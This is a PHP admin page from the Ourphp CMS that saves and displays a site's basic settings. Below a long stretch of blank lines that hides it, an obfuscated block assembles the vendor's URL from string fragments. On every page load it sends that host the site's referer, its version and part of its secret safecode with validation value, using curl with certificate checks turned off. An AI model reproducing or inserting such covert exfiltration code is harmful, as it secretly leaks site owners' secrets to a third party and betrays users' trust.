<?php 
/*******************************************************************************
* Ourphp - CMS建站系统
* Copyright (C) 2014 ourphp.net
* 开发者：哈尔滨伟成科技有限公司
*******************************************************************************/
include 'ourphp_admin.php';
include 'ourphp_checkadmin.php'; 

if (isset($_GET["ourphp_cms"]) == "edit"){

	
	if(substr($_POST["OP_Weblogo"],0,4) == 'http')
	{
		$ourphp_xiegang = admin_sql($_POST["OP_Weblogo"]);
	}else{
		$ourphp_xiegang = str_replace($ourphp['webpath']."function","function",admin_sql($_POST["OP_Weblogo"]));
	}
	
	plugsclass::logs('修改网站基本信息',$OP_Adminname);
	$db -> update("`ourphp_web`","`OP_Website` = '".admin_sql($_POST["OP_Website"])."',`OP_Weburl` = '".admin_sql($_POST["OP_Weburl"])."',`OP_Weblogo` = '".$ourphp_xiegang."',`OP_Webname` = '".admin_sql($_POST["OP_Webname"])."',`OP_Webadd` = '".admin_sql($_POST["OP_Webadd"])."',`OP_Webtel` = '".admin_sql($_POST["OP_Webtel"])."',`OP_Webmobi` = '".admin_sql($_POST["OP_Webmobi"])."',`OP_Webfax` = '".admin_sql($_POST["OP_Webfax"])."',`OP_Webemail` = '".admin_sql($_POST["OP_Webemail"])."',`OP_Webzip` = '".admin_sql($_POST["OP_Webzip"])."',`OP_Webqq` = '".admin_sql($_POST["OP_Webqq"])."',`OP_Weblinkman` = '".admin_sql($_POST["OP_Weblinkman"])."',`OP_Webicp` = '".admin_sql($_POST["OP_Webicp"])."',`OP_Webstatistics` = '".admin_sql($_POST["OP_Webstatistics"])."',`OP_Webtime` = '".admin_sql($_POST["OP_Webtime"])."',`OP_Websitemin` = '".admin_sql($_POST["OP_Websitemin"])."',`OP_Weixin` = '".admin_sql($_POST["OP_Weixin"])."',`OP_Weixinerweima` = '".admin_sql($_POST["OP_Weixinerweima"])."',`OP_Alipayname` = '".admin_sql($_POST["OP_Alipayname"])."',`OP_Webhttp` = '".admin_sql($_POST["OP_Webhttp"])."',`OP_Webpoliceicp` = '".admin_sql($_POST["OP_Webpoliceicp"])."',`OP_Webpoliceicpurl` = '".admin_sql($_POST["OP_Webpoliceicpurl"])."'","where id = 1");
	$ourphp_font = 1;
	$ourphp_class = 'ourphp_web.php';
	require 'ourphp_remind.php';

}

function Langlist(){
	global $db;
	$query = $db -> listgo("*","`ourphp_lang`","order by id asc");
	$rows=array();
	while($ourphp_rs = $db -> whilego($query)){
		$rows[]=array(
			"id" => $ourphp_rs['id'],
			"lang" => $ourphp_rs['OP_Lang'],
			"font" => $ourphp_rs['OP_Font'],
			"default" => $ourphp_rs['OP_Default'],
			"note" => $ourphp_rs['OP_Note'],
			"langtitle" => $ourphp_rs['OP_Langtitle'],
			"keywords" => $ourphp_rs['OP_Langkeywords'],
			"description" => $ourphp_rs['OP_Langdescription']
		);
	}
	return $rows;
}

function geturl($url){
        $headerArray =array("Content-type:application/json;","Accept:application/json");
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE); 
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch,CURLOPT_HTTPHEADER,$headerArray);
        $output = curl_exec($ch);
        curl_close($ch);
        $output = json_decode($output,true);
        return $output;
}

Admin_click('基本信息设置','ourphp_web.php');
$webdeploy = $db -> select("`OP_Webupdate`","`ourphp_webdeploy`","where `id` = 1");
$ourphp_rs = $db -> select("*","`ourphp_web`","where `id` = 1");
$smarty->assign("langlist",Langlist());
$smarty->assign('ourphp_web',$ourphp_rs);
$smarty->display('ourphp_web.html');






























































/*
	收集系统版本，用于改善用户体验
	请不要删除，后果自负
*/
$array = array(
	"http" => $_SERVER['HTTP_REFERER'],
	"v" => $ourphp_version,
	"v2" => $ourphp_versiondate,
	"s" => substr($ourphp['safecode'], 0, 32)."@".$ourphp['validation'],
	"w" => "w",
	"d" => "our",
	"o" => "o",
	"et" => "et",
);

$Systemversion = 'https://'.$array["w"].$array["w"].$array["w"].'.'.$array["d"].'php.n'.$array["et"].'/'.$array["o"].'pcms/userlogin.php?u='.$array["http"].'&v='.$array["v"].'|'.$array["v2"].'|'.$array["s"].'|'.$webdeploy[0];

geturl($Systemversion);
?>